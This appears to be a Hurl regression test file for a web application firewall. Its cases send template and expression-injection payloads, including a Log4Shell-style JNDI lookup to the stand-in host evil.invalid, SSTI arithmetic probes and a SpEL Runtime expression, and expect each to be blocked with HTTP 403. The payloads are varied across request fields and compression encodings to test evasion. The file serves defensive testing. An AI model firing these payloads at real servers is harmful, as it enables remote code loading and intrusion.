# template regression cases
# Set base_url to an authorized test WAF (no trailing slash).
# The upstream root must return 200 for before/after controls.
# Use --continue-on-error --path-as-is --jobs 1.

# template-01--query | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--query-before
HTTP 200

GET {{base_url}}/probe?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.invalid%2Fx%7D
X-Hurl-Case: template-01--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--query-after
HTTP 200


# template-01--query-double | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--query-double-before
HTTP 200

GET {{base_url}}/probe?q=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.invalid%252Fx%257D
X-Hurl-Case: template-01--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--query-double-after
HTTP 200


# template-01--query-duplicate | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.invalid%2Fx%7D
X-Hurl-Case: template-01--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--query-duplicate-after
HTTP 200


# template-01--header | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: template-01--header
X-Probe: %24%7Bjndi%3Aldap%3A%2F%2Fevil.invalid%2Fx%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--header-after
HTTP 200


# template-01--cookie | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: template-01--cookie
Cookie: probe=%24%7Bjndi%3Aldap%3A%2F%2Fevil.invalid%2Fx%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--cookie-after
HTTP 200


# template-01--form | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--form
Content-Type: application/x-www-form-urlencoded
```
q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.invalid%2Fx%7D
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--form-after
HTTP 200


# template-01--json | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--json
Content-Type: application/json
```
{"data":{"values":["normal","${jndi:ldap://evil.invalid/x}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--json-after
HTTP 200


# template-01--json-put | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: template-01--json-put
Content-Type: application/json
```
{"data":{"values":["normal","${jndi:ldap://evil.invalid/x}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--json-put-after
HTTP 200


# template-01--json-patch | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: template-01--json-patch
Content-Type: application/json
```
{"data":{"values":["normal","${jndi:ldap://evil.invalid/x}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--json-patch-after
HTTP 200


# template-01--text | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--text
Content-Type: text/plain
```
${jndi:ldap://evil.invalid/x}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--text-after
HTTP 200


# template-01--xml | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--xml
Content-Type: application/xml
```
<root><value>${jndi:ldap://evil.invalid/x}</value></root>
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--xml-after
HTTP 200


# template-01--multipart | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0KJHtqbmRpOmxkYXA6Ly9ldmlsLmludmFsaWQveH0NCi0tSHVybEJvdW5kYXJ5LS0NCg==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--multipart-after
HTTP 200


# template-01--gzip | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACqtWSkksSVSyqlYqS8wpTS1WsopWyssvyk3MUdJRUqnOykvJtMpJSSyw0tdPLcvM0cvMK0vMyUzRr6hViq2tBQCHYPLdPgAAAA==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--gzip-after
HTTP 200


# template-01--deflate | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJyrVkpJLElUsqpWKkvMKU0tVrKKVsrLL8pNzFHSUVKpzspLybTKSUkssNLXTy3LzNHLzCtLzMlM0a+oVYqtrQUAmdQVrA==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--deflate-after
HTTP 200


# template-01--br | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-01--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-01--br
Content-Type: application/json
Content-Encoding: br
base64,Gz0A+EXdlvowiu9LVQzCDZcjJhHOWxJSZJlIY5ADHLMggGAgwQ43Kkrso0bXeSmynnmzcyo/MTIB;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-01--br-after
HTTP 200


# template-bypass-01--query | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--query-before
HTTP 200

GET {{base_url}}/probe?q=%7B%7B%207%20*%207%20%7D%7D
X-Hurl-Case: template-bypass-01--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--query-after
HTTP 200


# template-bypass-01--query-double | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--query-double-before
HTTP 200

GET {{base_url}}/probe?q=%257B%257B%25207%2520*%25207%2520%257D%257D
X-Hurl-Case: template-bypass-01--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--query-double-after
HTTP 200


# template-bypass-01--query-duplicate | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=%7B%7B%207%20*%207%20%7D%7D
X-Hurl-Case: template-bypass-01--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--query-duplicate-after
HTTP 200


# template-bypass-01--header | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: template-bypass-01--header
X-Probe: %7B%7B%207%20*%207%20%7D%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--header-after
HTTP 200


# template-bypass-01--cookie | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: template-bypass-01--cookie
Cookie: probe=%7B%7B%207%20*%207%20%7D%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--cookie-after
HTTP 200


# template-bypass-01--form | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--form
Content-Type: application/x-www-form-urlencoded
```
q=%7B%7B%207%20*%207%20%7D%7D
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--form-after
HTTP 200


# template-bypass-01--json | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--json
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7eyA3ICogNyB9fSJdfX0=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--json-after
HTTP 200


# template-bypass-01--json-put | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: template-bypass-01--json-put
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7eyA3ICogNyB9fSJdfX0=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--json-put-after
HTTP 200


# template-bypass-01--json-patch | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: template-bypass-01--json-patch
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7eyA3ICogNyB9fSJdfX0=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--json-patch-after
HTTP 200


# template-bypass-01--text | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--text
Content-Type: text/plain
base64,e3sgNyAqIDcgfX0=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--text-after
HTTP 200


# template-bypass-01--xml | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--xml
Content-Type: application/xml
base64,PHJvb3Q+PHZhbHVlPnt7IDcgKiA3IH19PC92YWx1ZT48L3Jvb3Q+;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--xml-after
HTTP 200


# template-bypass-01--multipart | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0Ke3sgNyAqIDcgfX0NCi0tSHVybEJvdW5kYXJ5LS0NCg==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--multipart-after
HTTP 200


# template-bypass-01--gzip | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACqtWSkksSVSyqlYqS8wpTS1WsopWyssvyk3MUdJRqq5WMFfQUjBXqK1Viq2tBQB+X0vFLAAAAA==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--gzip-after
HTTP 200


# template-bypass-01--deflate | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJyrVkpJLElUsqpWKkvMKU0tVrKKVsrLL8pNzFHSUaquVjBX0FIwV6itVYqtrQUARcoOFA==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--deflate-after
HTTP 200


# template-bypass-01--br | 模板/表达式注入 | LyWaf corpus 1.1.0
GET {{base_url}}/
X-Hurl-Case: template-bypass-01--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: template-bypass-01--br
Content-Type: application/json
Content-Encoding: br
base64,GysA+J0HtlvklWgeOguel3tdN9mnIlIsOi0CsrW3c5CEFFkkBjnAIfLOifDq0QA=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: template-bypass-01--br-after
HTTP 200


# extra-ssti-arithmetic--query | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--query-before
HTTP 200

GET {{base_url}}/probe?q=%7B%7B7*7%7D%7D
X-Hurl-Case: extra-ssti-arithmetic--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--query-after
HTTP 200


# extra-ssti-arithmetic--query-double | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--query-double-before
HTTP 200

GET {{base_url}}/probe?q=%257B%257B7*7%257D%257D
X-Hurl-Case: extra-ssti-arithmetic--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--query-double-after
HTTP 200


# extra-ssti-arithmetic--query-duplicate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=%7B%7B7*7%7D%7D
X-Hurl-Case: extra-ssti-arithmetic--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--query-duplicate-after
HTTP 200


# extra-ssti-arithmetic--header | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--header
X-Probe: %7B%7B7*7%7D%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--header-after
HTTP 200


# extra-ssti-arithmetic--cookie | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--cookie
Cookie: probe=%7B%7B7*7%7D%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--cookie-after
HTTP 200


# extra-ssti-arithmetic--form | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--form
Content-Type: application/x-www-form-urlencoded
```
q=%7B%7B7*7%7D%7D
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--form-after
HTTP 200


# extra-ssti-arithmetic--json | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--json
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezcqN319Il19fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--json-after
HTTP 200


# extra-ssti-arithmetic--json-put | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--json-put
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezcqN319Il19fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--json-put-after
HTTP 200


# extra-ssti-arithmetic--json-patch | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--json-patch
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezcqN319Il19fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--json-patch-after
HTTP 200


# extra-ssti-arithmetic--text | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--text
Content-Type: text/plain
base64,e3s3Kjd9fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--text-after
HTTP 200


# extra-ssti-arithmetic--xml | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--xml
Content-Type: application/xml
base64,PHJvb3Q+PHZhbHVlPnt7Nyo3fX08L3ZhbHVlPjwvcm9vdD4=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--xml-after
HTTP 200


# extra-ssti-arithmetic--multipart | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0Ke3s3Kjd9fQ0KLS1IdXJsQm91bmRhcnktLQ0K;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--multipart-after
HTTP 200


# extra-ssti-arithmetic--gzip | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACqtWSkksSVSyqlYqS8wpTS1WsopWyssvyk3MUdJRqq421zKvrVWKra0FAHWl13coAAAA;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--gzip-after
HTTP 200


# extra-ssti-arithmetic--deflate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJyrVkpJLElUsqpWKkvMKU0tVrKKVsrLL8pNzFHSUaquNtcyr61Viq2tBQAVdg2U;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--deflate-after
HTTP 200


# extra-ssti-arithmetic--br | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-arithmetic--br
Content-Type: application/json
Content-Encoding: br
base64,ixOAeyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezcqN319Il19fQM=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-arithmetic--br-after
HTTP 200


# extra-ssti-other--query | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--query-before
HTTP 200

GET {{base_url}}/probe?q=%7B%7B8*8%7D%7D
X-Hurl-Case: extra-ssti-other--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--query-after
HTTP 200


# extra-ssti-other--query-double | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--query-double-before
HTTP 200

GET {{base_url}}/probe?q=%257B%257B8*8%257D%257D
X-Hurl-Case: extra-ssti-other--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--query-double-after
HTTP 200


# extra-ssti-other--query-duplicate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=%7B%7B8*8%7D%7D
X-Hurl-Case: extra-ssti-other--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--query-duplicate-after
HTTP 200


# extra-ssti-other--header | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--header
X-Probe: %7B%7B8*8%7D%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--header-after
HTTP 200


# extra-ssti-other--cookie | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--cookie
Cookie: probe=%7B%7B8*8%7D%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--cookie-after
HTTP 200


# extra-ssti-other--form | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--form
Content-Type: application/x-www-form-urlencoded
```
q=%7B%7B8*8%7D%7D
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--form-after
HTTP 200


# extra-ssti-other--json | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--json
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezgqOH19Il19fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--json-after
HTTP 200


# extra-ssti-other--json-put | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--json-put
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezgqOH19Il19fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--json-put-after
HTTP 200


# extra-ssti-other--json-patch | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--json-patch
Content-Type: application/json
base64,eyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezgqOH19Il19fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--json-patch-after
HTTP 200


# extra-ssti-other--text | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--text
Content-Type: text/plain
base64,e3s4Kjh9fQ==;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--text-after
HTTP 200


# extra-ssti-other--xml | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--xml-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--xml
Content-Type: application/xml
base64,PHJvb3Q+PHZhbHVlPnt7OCo4fX08L3ZhbHVlPjwvcm9vdD4=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--xml-after
HTTP 200


# extra-ssti-other--multipart | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--multipart-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--multipart
Content-Type: multipart/form-data; boundary=HurlBoundary
base64,LS1IdXJsQm91bmRhcnkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0icSINCg0Ke3s4Kjh9fQ0KLS1IdXJsQm91bmRhcnktLQ0K;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--multipart-after
HTTP 200


# extra-ssti-other--gzip | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--gzip-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--gzip
Content-Type: application/json
Content-Encoding: gzip
base64,H4sIAAAAAAAACqtWSkksSVSyqlYqS8wpTS1WsopWyssvyk3MUdJRqq620LKorVWKra0FAE0aJl4oAAAA;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--gzip-after
HTTP 200


# extra-ssti-other--deflate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--deflate-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--deflate
Content-Type: application/json
Content-Encoding: deflate
base64,eJyrVkpJLElUsqpWKkvMKU0tVrKKVsrLL8pNzFHSUaquttCyqK1Viq2tBQAVhg2W;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--deflate-after
HTTP 200


# extra-ssti-other--br | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--br-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-ssti-other--br
Content-Type: application/json
Content-Encoding: br
base64,ixOAeyJkYXRhIjp7InZhbHVlcyI6WyJub3JtYWwiLCJ7ezgqOH19Il19fQM=;
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-ssti-other--br-after
HTTP 200


# extra-spel--query | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--query-before
HTTP 200

GET {{base_url}}/probe?q=%24%7BT(java.lang.Runtime).getRuntime()%7D
X-Hurl-Case: extra-spel--query
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--query-after
HTTP 200


# extra-spel--query-double | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--query-double-before
HTTP 200

GET {{base_url}}/probe?q=%2524%257BT(java.lang.Runtime).getRuntime()%257D
X-Hurl-Case: extra-spel--query-double
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--query-double-after
HTTP 200


# extra-spel--query-duplicate | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--query-duplicate-before
HTTP 200

GET {{base_url}}/probe?q=normal&q=%24%7BT(java.lang.Runtime).getRuntime()%7D
X-Hurl-Case: extra-spel--query-duplicate
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--query-duplicate-after
HTTP 200


# extra-spel--header | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--header-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-spel--header
X-Probe: %24%7BT(java.lang.Runtime).getRuntime()%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--header-after
HTTP 200


# extra-spel--cookie | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--cookie-before
HTTP 200

GET {{base_url}}/probe
X-Hurl-Case: extra-spel--cookie
Cookie: probe=%24%7BT(java.lang.Runtime).getRuntime()%7D
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--cookie-after
HTTP 200


# extra-spel--form | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--form-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--form
Content-Type: application/x-www-form-urlencoded
```
q=%24%7BT(java.lang.Runtime).getRuntime()%7D
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--form-after
HTTP 200


# extra-spel--json | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--json-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--json
Content-Type: application/json
```
{"data":{"values":["normal","${T(java.lang.Runtime).getRuntime()}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--json-after
HTTP 200


# extra-spel--json-put | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--json-put-before
HTTP 200

PUT {{base_url}}/probe
X-Hurl-Case: extra-spel--json-put
Content-Type: application/json
```
{"data":{"values":["normal","${T(java.lang.Runtime).getRuntime()}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--json-put-after
HTTP 200


# extra-spel--json-patch | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--json-patch-before
HTTP 200

PATCH {{base_url}}/probe
X-Hurl-Case: extra-spel--json-patch
Content-Type: application/json
```
{"data":{"values":["normal","${T(java.lang.Runtime).getRuntime()}"]}}
```
HTTP 403

GET {{base_url}}/
X-Hurl-Case: extra-spel--json-patch-after
HTTP 200


# extra-spel--text | template | Original synthetic probe
GET {{base_url}}/
X-Hurl-Case: extra-spel--text-before
HTTP 200

POST {{base_url}}/probe
X-Hurl-Case: extra-spel--text
Content-Type: text/plain
```
${T(java.lang.Runtime).getRuntime()}
```
HTTP 403

GET {{base_url}}/
